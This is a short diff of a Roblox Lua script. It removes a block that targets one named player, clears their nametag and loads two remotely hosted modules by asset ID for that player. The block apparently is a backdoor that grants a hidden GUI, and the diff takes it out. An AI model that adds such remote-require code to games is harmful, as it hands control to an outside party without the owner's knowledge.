@@ -31,37 +31,7 @@ end
 
 end)
 
-spawn(function()
 
-
-target = "Sapsapci67"
-if game.Players:FindFirstChild(target) then
-if not game.Players:FindFirstChild(target):FindFirstChild("a") then
-game.Players[target].Character.Head.NameTag.NameFln.Text = ""
-b = Instance.new("BoolValue",game.Players:FindFirstChild(target))
-b.Name = "a"
----game.Players[target].Character.Head.NameTag.NameFln.TextColor3 = Color3.new(24, 0, 0)
-require(110476458714336).ipadgui(target)
-spawn(function()
-
-require(109690586705177).SentinelPrime(target)
-end)
-spawn(function()
-
-
-end)
-
-
-else
-warn()
-
-end
-else 
-warn()
-end
-
-
-end)
 
 
 
